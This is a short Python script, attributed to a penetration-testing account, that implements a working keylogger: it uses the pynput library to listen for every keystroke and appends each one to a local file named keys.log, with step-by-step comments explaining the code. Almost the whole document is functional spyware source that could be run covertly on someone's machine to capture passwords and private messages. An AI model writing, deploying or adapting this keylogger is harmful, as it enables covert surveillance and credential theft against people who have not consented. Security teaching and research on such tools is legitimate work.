
#! py
########################################
#Copyright of Xtreme Pentesting, 2021  #
#https://www.twitter.com/xtremepentest #        
#https://www.github.com/0xtraw         #
########################################

# this will help us read the keystrokes as the user types in stuff
from pynput.keyboard import Key, Listener

keys = []
def on_keypress(key):
    # appending the pressed key into the keys list
    keys.append(key)
    # iterate through each key in a list and call the log_keys function
    # which takes the key as an argument
    for key in keys:
        log_keys(key)

# a helper function which logs the pressed key into a file
def log_keys(key):
    # opening a file to append the pressed key
    with open("keys.log", 'a') as logfile:
        # removing unwanted strings from our pressed key
        key = str(key).replace("'", "")
        # check to see if the pressed key has a certain text/string
        # if true/ > 0 we replace it with the required value
        # otherwise we just append it into the file as it is
        if key.find("backspace") > 0:
            logfile.write(" backspcae ")
        elif key.find("space") > 0:
            logfile.write(" ")
        elif key.find("shift") > 0:
            logfile.write(" shift ")
        elif key.find("enter") > 0:
            logfile.write("\n")
        elif key.find("caps_lock") > 0:
            logfile.write(" capslock ")
        else:
            logfile.write(key)
        # finally we cleared our global keys list, so that we don't have key
        # duplicates appended in the file. the next time we press another key
        keys.clear()

# starting the main function
if __name__ == '__main__': 
    # creating an instance of a Listener which which listenes for key strokes and pass the function (`on_keypress`) we created as an argument.   
    with Listener(on_press=on_keypress) as listener:
        # joining the listener thread
        listener.join()